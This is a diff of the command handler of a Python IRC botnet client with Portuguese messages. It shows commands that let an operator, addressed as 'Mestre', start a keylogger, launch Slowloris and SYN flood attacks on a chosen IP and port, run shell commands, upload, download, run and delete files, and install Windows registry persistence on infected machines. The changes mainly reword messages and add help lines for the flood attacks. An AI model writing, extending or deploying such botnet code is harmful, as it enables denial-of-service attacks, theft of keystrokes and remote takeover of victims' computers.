@@ -435,10 +435,10 @@ def main():
                 p = ircMsgClean.split()
                 pwd = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] tente: <login> <senha>")
+                msgSend(ircChannel, "[+] Sintaxe [+] tente: <login> <senha>")
             else:
                 if pwd != botPass:
-                    msgSend(ircChannel, "[!] Parado ai, vagabundo: Senha Invalida, ou voce nao pode logar [!]")
+                    msgSend(ircChannel, "[!] Parado! Senha Invalida, ou voce nao pode logar [!]")
                 else:
                     msgSend(ircChannel, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
                     login = True
@@ -463,7 +463,7 @@ def main():
                 tmp3 = p[7]
                 sport = int(float(tmp3))
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <slow start> <socket count> <ip> <port> <" + botNick + ">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow start> <socket count> <ip> <port> [wave]<" + botNick + ">")
             except ValueError:
                 pass
             else:
@@ -478,7 +478,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <slow stop> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow stop> <" + botNick +">")
             else:
                 if id == botNick or id == 'wave':
                     for p in multiprocessing.active_children():
@@ -496,7 +496,7 @@ def main():
                 port = int(p[7])
 
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <plum start> <threads> <ip> <port> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <plum start> <threads> <ip> <port> [<" + botNick +"> ou <wave>]")
             except ValueError:
                 pass
             else:
@@ -511,7 +511,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <plum stop> <" + botNick +"> ")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <plum stop> [<" + botNick +"> ou <wave>]")
             else:
                 if id == botNick or id == 'wave':
                     for p in multiprocessing.active_children():
@@ -524,25 +524,25 @@ def main():
                 p = ircMsgClean.split()
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <keylog start> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <keylog start> [<" + botNick +"> ou <wave>]")
             else:
                 if id == botNick or id == 'wave':
                     pr = multiprocessing.Process(target=keylog)
                     pr.daemon = True
                     pr.start()
-                    msgSend(ircChannel, "[+] Iniciando Keylogger [+]")
+                    msgSend(ircChannel, "[+] Keylogger ativado [+]")
 
         elif ircMsg.find(str.encode("keylog stop")) != -1:
             try:
                 p = ircMsgClean.split()
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <keylog stop> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <keylog stop> [<" + botNick +"> ou <wave>]")
             else:
                 if id == botNick or id == 'wave':
                     for p in multiprocessing.active_children():
                         p.terminate()
-                        msgSend(ircChannel, "[+] Terminando Keylogger [+]")
+                        msgSend(ircChannel, "[+] Keylogger desativado [+]")
 
         elif ircMsg.find(str.encode("PING :")) != -1:
             ping()
@@ -559,10 +559,12 @@ def main():
                 p = ircMsgClean.split()
                 id = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <help> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <help> <" + botNick +">")
             else:
                 if id == botNick:
                     msgSend(ircChannel, "[+] Bem Vindo, Mestre " + masterName + " [+]")
+                    time.sleep(1)
+                    msgSend(ircChannel, "use: [botnick]       para listar os nomes dos bots ativos")
                     time.sleep(1)
                     msgSend(ircChannel, "use: [matar]         para matar os bots ativos")
                     time.sleep(1)
@@ -588,6 +590,14 @@ def main():
                     time.sleep(1)
                     msgSend(ircChannel, "use: [keylog stop]   para desativar o keylogger")
                     time.sleep(1)
+                    msgSend(ircChannel, "use: [slow start]    para ativar o ataque SLOWLORIS")
+                    time.sleep(1)
+                    msgSend(ircChannel, "use: [slow stop]     para desativar o ataque SLOWLORIS")
+                    time.sleep(1)
+                    msgSend(ircChannel, "use: [plum start]    para ativar o ataque SYN FLOOD")
+                    time.sleep(1)
+                    msgSend(ircChannel, "use: [plum stop]     para desativar o ataque SYN FLOOD")
+                    time.sleep(1)
                     msgSend(ircChannel, "use: [persistence]   para instalar persistencia no registro do Windows")
 
         elif ircMsg.find(str.encode("botnick")) != -1:
@@ -598,7 +608,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <dir> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <dir> <" + botNick +">")
             else:
                 if id == botNick:
                     msgSend(ircChannel, "[+] Diretorio atual do zumbi: " + os.getcwd())
@@ -608,7 +618,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <ls> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <ls> <" + botNick +">")
             else:
                 if id == botNick:
                     listArq()
@@ -618,7 +628,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <ip> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <ip> <" + botNick +">")
             else:
                 if id == botNick:
                     yx = getPublicIp()
@@ -631,7 +641,7 @@ def main():
                 fileUp = p[4]
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <upload> <Arquivo> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <upload> <Arquivo> <" + botNick +">")
             else:
                 if fileUp == fileUp and id == botNick:
                     msgSend(ircChannel, "[+] Upload em andamento, aguarde um pouco. [+]")
@@ -643,7 +653,7 @@ def main():
                 urlDown = p[4]
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <download> <link> <"+ botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <download> <link> <"+ botNick +">")
             else:
                 if urlDown == urlDown and id == botNick:
                     download()
@@ -654,7 +664,7 @@ def main():
                 fileRun = p[4]
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <run> <programa> <"+ botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <run> <programa> <"+ botNick +">")
             else:
                 if fileRun == fileRun and id == botNick:
                     run()
@@ -665,7 +675,7 @@ def main():
                 delFile = p[4]
                 id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <delete> <arquivo> <"+ botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <delete> <arquivo> <"+ botNick +">")
             else:
                 if delFile == delFile and id == botNick:
                     deleteFile()
@@ -680,7 +690,7 @@ def main():
 
                 id = p[-1]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <shell> <comando> <" + botNick + ">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <shell> <comando> <" + botNick + ">")
             else:
                 if comando == comando and id == botNick:
                     shell()
@@ -690,7 +700,7 @@ def main():
                 p = ircMsgClean.split()
                 id = p[4]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <persistence> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <persistence> <" + botNick +">")
             else:
                 if id == botNick:
                     persis()
